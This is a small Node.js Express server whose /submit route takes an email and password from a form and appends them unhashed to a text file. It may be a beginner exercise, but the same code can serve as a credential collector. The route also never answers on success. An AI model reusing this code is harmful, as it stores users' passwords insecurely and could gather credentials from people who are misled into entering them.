import express from "express";
import bodyParser from "body-parser";
import fs from "fs";
const app = express();
const port = 3000;

app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.render("index.ejs");
});

app.post("/submit" ,(req,res) => {
    const{email,password}=req.body;
    if(!email || !password) {
        return res.status (400).send("Email and password are required");
    }

    const dataToWrite=`Email : ${email} , Password : ${password} \n`;
    fs.appendFile("Text.txt",dataToWrite,'utf-8', (err) => {
        if (err) throw err;
        console.log("Data has been saved to Text.txt");
    });
});


app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something went wrong!');
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
